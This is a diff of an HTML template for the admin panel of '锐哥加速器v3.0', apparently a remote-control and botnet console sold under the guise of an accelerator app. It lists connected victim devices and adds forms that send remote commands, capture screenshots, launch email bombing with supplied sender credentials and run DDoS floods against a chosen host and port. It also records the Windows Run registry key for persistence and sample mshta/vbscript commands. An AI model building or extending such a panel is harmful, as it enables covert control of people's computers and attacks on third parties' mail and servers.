@@ -4,47 +4,117 @@
     <meta charset="UTF-8">
     <title>锐哥加速器v3.0管理后台</title>
     <meta name="viewport" content="width=device-width" initial-scale="1"/>
+    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
 </head>
+
 <body style="margin: 20px;">
+    {% for message in get_flashed_messages() %}
+        <div class="alert alert-info">
+            <button type="button" class="close" data-dismiss="alert" aria-hidden="true">
+                &times;
+            </button>
+            {{ message }}
+        </div>
+    {% endfor %}
     <h1>锐哥加速器v3.0管理后台</h1>
-    <p>当前在线设备数：{{ users|length }}</p>
-    <form action="/action" method="post">
-        <input name="command" placeholder="需要发送的远程命令"/>
-        <input type="submit" />
+    <br />
+    <h4>当前在线设备数：{{ users|length }}</h4>
+    <h4>最新版本：{{ version }}&emsp;&emsp;<a href="{{ download_address }}" target="_blank">下载地址</a></h4>
+    <br />
+    <form action="/action" method="post" class="form-inline">
+        <input name="command" placeholder="需要发送的远程命令" required class="form-control" />
+        <input name="send_to" placeholder="接受者" class="form-control" />
+        <input type="submit" class="btn btn-primary" value="发送命令" />
     </form>
     <br />
-    <form action="/screenshot" method="post">
-        <input type="submit" value="截图" />
+    <form action="/screenshot" method="post" class="form-inline">
+        <input type="submit" value="截图" class="btn btn-primary" />
     </form>
     <br />
-    <form action="/mail-attack" method="post">
-        <input name="times" placeholder="次数" required />
-        <input name="from-address" placeholder="发送者地址" required />
-        <input name="from-password" placeholder="发送者密码" required />
-        <input name="to-address" placeholder="收件人地址" required />
-        <input name="from-name" placeholder="发件姓名" />
-        <input name="title" placeholder="邮件标题" />
-        <input name="content" placeholder="邮件内容" />
-        <input type="submit" />
+    <form action="/mail-attack" method="post" class="form-inline">
+        <input name="times" placeholder="次数" class="form-control" required />
+        <input name="from-address" placeholder="发送者地址" class="form-control" required />
+        <input name="from-password" placeholder="发送者密码" class="form-control" required />
+        <input name="to-address" placeholder="收件人地址" class="form-control" required />
+        <input name="from-name" placeholder="发件姓名" class="form-control" />
+        <input name="title" placeholder="邮件标题" class="form-control" />
+        <input name="content" placeholder="邮件内容" class="form-control" />
+        <input type="submit" class="btn btn-primary" value="发送邮件轰炸" />
     </form>
     <br />
-    <form action="/ddos" method="post">
-        <input name="times" placeholder="次数" value="8080" required />
-        <input name="host" placeholder="地址" required />
-        <input name="page" placeholder="路径" value="/" required />
-        <input name="port" placeholder="端口" value="80" required />
-        <input type="submit" />
+    <form action="/ddos" method="post" class="form-inline">
+        <input name="times" placeholder="次数" value="8080" class="form-control" required />
+        <input name="host" placeholder="地址" class="form-control" required />
+        <input name="page" placeholder="路径" class="form-control" value="/" required />
+        <input name="port" placeholder="端口" class="form-control" value="80" required />
+        <input type="submit" class="btn btn-primary" value="发送DDOS" />
     </form>
+{#    <br />#}
+{#    <form action="/stop-once" method="post" class="form-inline">#}
+{#        <input name="name" placeholder="临时停止" class="form-control" />#}
+{#        <input type="submit" value="临时停止设备" class="btn btn-primary" />#}
+{#    </form>#}
+    <br />
+    <form action="/stop-forever" method="post" class="form-inline">
+        <input name="name" placeholder="永久停止" class="form-control" />
+        <input name="reopen" placeholder="重新开启" class="form-control" />
+        <input type="submit" value="永久停止/重新开启" class="btn btn-primary" />
+    </form>
+{#    <br />#}
+{#    <form action="/show-version" method="post" class="form-inline">#}
+{#        <input name="name" placeholder="展示版本" class="form-control" />#}
+{#        <input type="submit" value="显示版本信息" class="btn btn-primary" />#}
+{#    </form>#}
     <br />
     <br />
 
+    <br />
+
+    <table class="table table-hover">
+    <tbody>
+    <tr>
+        <th>设备名称</th>
+        <th>设备别名</th>
+        <th>最近连接</th>
+        <th>查看截图</th>
+        <th>临时下线</th>
+        <th>展示版本</th>
+    </tr>
+    {% for i in users.keys() %}
+    <tr>
+        <td>{{ i }}</td>
+        <td>{{ another_name[i] }}</td>
+        <td>{{ round(time() - users[i], 1) }}</td>
+        <td><a href="/static/{{ i }}.jpg" target="_blank">查看截图</a></td>
+        <td><a href="/stop-once?name={{ i }}" target="_top">临时下线</a></td>
+        <td><a href="/show-version?name={{ i }}" target="_top">展示版本</a></td>
+    </tr>
+    {% endfor %}
+    </tbody>
+    </table>
     <hr />
+    <form action="/set-another-name" method="post" class="form-inline">
+        <input name="name" placeholder="原始名称" class="form-control" />
+        <input name="another_name" placeholder="标记名称" class="form-control" />
+        <input type="submit" value="设置" class="btn btn-primary" />
+    </form>
+
+    <br />
 
     <br />
     <br />
     <h4>命令提示</h4>
     <p>mshta vbscript:msgbox("我是提示内容",64,"我是提示标题")(window.close)</p>
     <p>echo msgbox "我是提示内容",64,"我是提示标题">alert.vbs && start alert.vbs && ping -n 2 127.1>nul && del alert.vbs</p>
+    <h4>注册表</h4>
+    <p>Software\Microsoft\Windows\CurrentVersion\Run</p>
+
+    <br />
+    <br />
+    <br />
+
+    <h4 style="text-align: center;">数据无价，谨慎操作</h4>
+    <h4 style="text-align: center;">严守法规底线</h4>
 
 </body>
 </html>
